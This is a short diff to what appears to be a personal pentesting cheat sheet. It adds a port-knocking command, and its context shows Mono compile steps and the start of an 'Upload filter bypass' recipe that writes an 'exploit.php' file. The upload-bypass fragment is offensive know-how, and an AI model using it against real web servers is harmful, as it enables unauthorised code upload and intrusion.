@@ -131,7 +131,8 @@ sudo apt install mono-complete
 mcs -out:hello.exe hello.cs
 mono hello.exe  
 
-
+#Port knocking  
+knock my_server port1 port2 port3  
 
 #Upload filter bypass  
 f = open('exploit.php', 'w')  
